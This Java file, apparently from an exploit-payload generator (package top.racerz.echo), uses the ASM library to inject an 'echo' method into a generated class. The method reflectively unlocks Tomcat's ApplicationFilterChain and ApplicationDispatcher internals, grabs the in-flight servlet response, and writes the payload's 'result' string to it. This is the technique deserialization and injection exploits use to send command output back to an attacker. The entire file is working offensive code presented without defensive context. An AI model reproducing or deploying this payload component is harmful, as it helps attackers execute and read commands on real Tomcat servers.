package top.racerz.echo;

import org.objectweb.asm.*;

public class Tomcat implements Opcodes {

    public static void insert(ClassWriter cw, String option) {

        {
            MethodVisitor mv = cw.visitMethod(ACC_PUBLIC, "echo", "()V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/lang/Exception");
            mv.visitLabel(l0);
            mv.visitLineNumber(44, l0);
            mv.visitLdcInsn("org.apache.catalina.core.ApplicationDispatcher");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitLdcInsn("WRAP_SAME_OBJECT");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(ASTORE, 1);
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(45, l3);
            mv.visitLdcInsn(Type.getType("Lorg/apache/catalina/core/ApplicationFilterChain;"));
            mv.visitLdcInsn("lastServicedRequest");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(ASTORE, 2);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(46, l4);
            mv.visitLdcInsn(Type.getType("Lorg/apache/catalina/core/ApplicationFilterChain;"));
            mv.visitLdcInsn("lastServicedResponse");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(ASTORE, 3);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(48, l5);
            mv.visitLdcInsn(Type.getType("Ljava/lang/reflect/Field;"));
            mv.visitLdcInsn("modifiers");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(ASTORE, 4);
            Label l6 = new Label();
            mv.visitLabel(l6);
            mv.visitLineNumber(49, l6);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(50, l7);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "getModifiers", "()I", false);
            mv.visitIntInsn(BIPUSH, -17);
            mv.visitInsn(IAND);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setInt", "(Ljava/lang/Object;I)V", false);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(51, l8);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "getModifiers", "()I", false);
            mv.visitIntInsn(BIPUSH, -17);
            mv.visitInsn(IAND);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setInt", "(Ljava/lang/Object;I)V", false);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(52, l9);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "getModifiers", "()I", false);
            mv.visitIntInsn(BIPUSH, -17);
            mv.visitInsn(IAND);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setInt", "(Ljava/lang/Object;I)V", false);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(54, l10);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitLineNumber(55, l11);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            Label l12 = new Label();
            mv.visitLabel(l12);
            mv.visitLineNumber(56, l12);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            Label l13 = new Label();
            mv.visitLabel(l13);
            mv.visitLineNumber(58, l13);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ACONST_NULL);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "get", "(Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(CHECKCAST, "java/lang/ThreadLocal");
            mv.visitVarInsn(ASTORE, 5);
            Label l14 = new Label();
            mv.visitLabel(l14);
            mv.visitLineNumber(59, l14);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitInsn(ACONST_NULL);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "get", "(Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(CHECKCAST, "java/lang/ThreadLocal");
            mv.visitVarInsn(ASTORE, 6);
            Label l15 = new Label();
            mv.visitLabel(l15);
            mv.visitLineNumber(60, l15);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitInsn(ACONST_NULL);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "getBoolean", "(Ljava/lang/Object;)Z", false);
            mv.visitVarInsn(ISTORE, 7);
            Label l16 = new Label();
            mv.visitLabel(l16);
            mv.visitLineNumber(61, l16);
            mv.visitVarInsn(ILOAD, 7);
            Label l17 = new Label();
            mv.visitJumpInsn(IFEQ, l17);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitJumpInsn(IFNULL, l17);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitJumpInsn(IFNULL, l17);
            Label l18 = new Label();
            mv.visitLabel(l18);
            mv.visitLineNumber(62, l18);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/ThreadLocal", "get", "()Ljava/lang/Object;", false);
            mv.visitTypeInsn(CHECKCAST, "javax/servlet/ServletResponse");
            mv.visitVarInsn(ASTORE, 8);
            Label l19 = new Label();
            mv.visitLabel(l19);
            mv.visitLineNumber(63, l19);
            mv.visitVarInsn(ALOAD, 8);
            mv.visitMethodInsn(INVOKEINTERFACE, "javax/servlet/ServletResponse", "getWriter", "()Ljava/io/PrintWriter;", true);
            mv.visitVarInsn(ASTORE, 9);
            Label l20 = new Label();
            mv.visitLabel(l20);
            mv.visitLineNumber(64, l20);
            mv.visitLdcInsn(Type.getType("Lorg/apache/catalina/connector/ResponseFacade;"));
            mv.visitLdcInsn("response");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(ASTORE, 10);
            Label l21 = new Label();
            mv.visitLabel(l21);
            mv.visitLineNumber(65, l21);
            mv.visitVarInsn(ALOAD, 10);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            Label l22 = new Label();
            mv.visitLabel(l22);
            mv.visitLineNumber(66, l22);
            mv.visitVarInsn(ALOAD, 10);
            mv.visitVarInsn(ALOAD, 8);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "get", "(Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(CHECKCAST, "org/apache/catalina/connector/Response");
            mv.visitVarInsn(ASTORE, 11);
            Label l23 = new Label();
            mv.visitLabel(l23);
            mv.visitLineNumber(67, l23);
            mv.visitLdcInsn(Type.getType("Lorg/apache/catalina/connector/Response;"));
            mv.visitLdcInsn("usingWriter");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(ASTORE, 12);
            Label l24 = new Label();
            mv.visitLabel(l24);
            mv.visitLineNumber(68, l24);
            mv.visitVarInsn(ALOAD, 12);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            Label l25 = new Label();
            mv.visitLabel(l25);
            mv.visitLineNumber(69, l25);
            mv.visitVarInsn(ALOAD, 12);
            mv.visitVarInsn(ALOAD, 11);
            mv.visitFieldInsn(GETSTATIC, "java/lang/Boolean", "FALSE", "Ljava/lang/Boolean;");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "set", "(Ljava/lang/Object;Ljava/lang/Object;)V", false);
            Label l26 = new Label();
            mv.visitLabel(l26);
            mv.visitLineNumber(70, l26);
            mv.visitVarInsn(ALOAD, 9);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitFieldInsn(GETFIELD, option, "result", "Ljava/lang/String;");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/Writer", "write", "(Ljava/lang/String;)V", false);
            Label l27 = new Label();
            mv.visitLabel(l27);
            mv.visitLineNumber(71, l27);
            mv.visitVarInsn(ALOAD, 9);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/Writer", "flush", "()V", false);
            Label l28 = new Label();
            mv.visitLabel(l28);
            mv.visitLineNumber(72, l28);
            mv.visitJumpInsn(GOTO, l1);
            mv.visitLabel(l17);
            mv.visitLineNumber(73, l17);
            mv.visitFrame(Opcodes.F_FULL, 8, new Object[]{option, "java/lang/reflect/Field", "java/lang/reflect/Field", "java/lang/reflect/Field", "java/lang/reflect/Field", "java/lang/ThreadLocal", "java/lang/ThreadLocal", Opcodes.INTEGER}, 0, new Object[]{});
            mv.visitVarInsn(ALOAD, 2);
            mv.visitInsn(ACONST_NULL);
            mv.visitTypeInsn(NEW, "java/lang/ThreadLocal");
            mv.visitInsn(DUP);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/ThreadLocal", "<init>", "()V", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "set", "(Ljava/lang/Object;Ljava/lang/Object;)V", false);
            Label l29 = new Label();
            mv.visitLabel(l29);
            mv.visitLineNumber(74, l29);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ACONST_NULL);
            mv.visitTypeInsn(NEW, "java/lang/ThreadLocal");
            mv.visitInsn(DUP);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/ThreadLocal", "<init>", "()V", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "set", "(Ljava/lang/Object;Ljava/lang/Object;)V", false);
            Label l30 = new Label();
            mv.visitLabel(l30);
            mv.visitLineNumber(75, l30);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitInsn(ACONST_NULL);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Boolean", "valueOf", "(Z)Ljava/lang/Boolean;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "set", "(Ljava/lang/Object;Ljava/lang/Object;)V", false);
            mv.visitLabel(l1);
            mv.visitLineNumber(79, l1);
            mv.visitFrame(Opcodes.F_FULL, 1, new Object[]{option}, 0, new Object[]{});
            Label l31 = new Label();
            mv.visitJumpInsn(GOTO, l31);
            mv.visitLabel(l2);
            mv.visitLineNumber(77, l2);
            mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[]{"java/lang/Exception"});
            mv.visitVarInsn(ASTORE, 1);
            Label l32 = new Label();
            mv.visitLabel(l32);
            mv.visitLineNumber(78, l32);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace", "()V", false);
            mv.visitLabel(l31);
            mv.visitLineNumber(81, l31);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitInsn(RETURN);
            Label l33 = new Label();
            mv.visitLabel(l33);
            mv.visitLocalVariable("responseFacade", "Ljavax/servlet/ServletResponse;", null, l19, l28, 8);
            mv.visitLocalVariable("writer", "Ljava/io/Writer;", null, l20, l28, 9);
            mv.visitLocalVariable("responseField", "Ljava/lang/reflect/Field;", null, l21, l28, 10);
            mv.visitLocalVariable("response", "Lorg/apache/catalina/connector/Response;", null, l23, l28, 11);
            mv.visitLocalVariable("usingWriter", "Ljava/lang/reflect/Field;", null, l24, l28, 12);
            mv.visitLocalVariable("wrap_same_object", "Ljava/lang/reflect/Field;", null, l3, l1, 1);
            mv.visitLocalVariable("lastServicedRequestField", "Ljava/lang/reflect/Field;", null, l4, l1, 2);
            mv.visitLocalVariable("lastServicedResponseField", "Ljava/lang/reflect/Field;", null, l5, l1, 3);
            mv.visitLocalVariable("modifiersField", "Ljava/lang/reflect/Field;", null, l6, l1, 4);
            mv.visitLocalVariable("lastServicedResponse", "Ljava/lang/ThreadLocal;", null, l14, l1, 5);
            mv.visitLocalVariable("lastServicedRequest", "Ljava/lang/ThreadLocal;", null, l15, l1, 6);
            mv.visitLocalVariable("WRAP_SAME_OBJECT", "Z", null, l16, l1, 7);
            mv.visitLocalVariable("e", "Ljava/lang/Exception;", null, l32, l31, 1);
            mv.visitLocalVariable("this", "L" + option + ";", null, l0, l33, 0);
            mv.visitMaxs(4, 13);
            mv.visitEnd();
        }
    }
}
